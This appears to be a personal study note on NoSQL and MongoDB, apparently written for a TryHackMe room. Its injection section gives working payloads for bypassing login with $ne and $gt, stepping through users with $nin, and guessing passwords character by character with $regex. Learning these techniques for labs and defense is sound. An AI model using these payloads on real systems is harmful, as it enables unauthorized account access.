#  NoSQL
## Introduction to NoSQL databases

NoSQL databases are non-relational meaning they do not store information in regular tabular manner. Key-value(An index and value stored at the indexed location), Graph(Data stored in graph structure), Document(have key-value elements with metadata), xml Databases are a subclass), Wide Column Store(tabular but irregular in width, from row to row). See [Wiki](https://en.wikipedia.org/wiki/NoSQL) further information. For [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection), or more basics of SQL see [[Introduction-to-SQL]]

## MongoDB
[MongoDB](https://www.mongodb.com/) is JSON-like, document store type NoSQL database. Its data is a JSON-like structure called a **Document**. Documents are stored in an associative array with an arbitrary number of fields. These can be store heirarchically called **Collections**. Collections are the equivalent of tables in relational databases; multiple collections are grouped in **databases**. 

I uses NoSQL queries, not SQL-like:
```nosql
['KEY' => 'VALUE']
['KEY' => 'VALUE', 'KEY' => 'VALUE']
['KEY' => ['$lt'=>'1337']]` # Logic can eb used to filter
```
Although keys in this instance can be strings, properties to which the value is some string relationed to it storage key: `["username" : "admin"]

#### MongoDB injection
Due NoSQL queries requiring nested associative arrays a NoSQL injection must be capable of injecting arrays into the application.

This will authenication bypass to the first user in the database:  
`user[$ne]=xxxx&pass[$ne]=yyyy` or `user[$gt]=xxxx&pass[$gt]=yyyy`  
query performed:  
`['username'=>['$ne'=>['yyyy'] ], 'password'=>['$ne'=>'yyyy']]`
 To get the nth users, create filter with $nin by specifying criteria where the desired documents have some field, not in a list of values:  
 `user[$nin][]=xxxx&pass[$ne]=yyyy`  
 The query performed:  
 `['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'00001111']]`
 Repeat by adding `&user[$nin][]=`
  
  For passwords `$regex` operator, with a regex the number in curly brackets the length of a wildcard password:  
  `user=admin&pass[$regex]=^.{7}$`
  Then to fuzz with another `[$regex]=^a......$`; if you login the first letter is `a` if error is not. 


## Reference
[TryHackMe](https://tryhackme.com/room/nosqlinjectiontutorial)
[Wiki](https://en.wikipedia.org/wiki/NoSQL)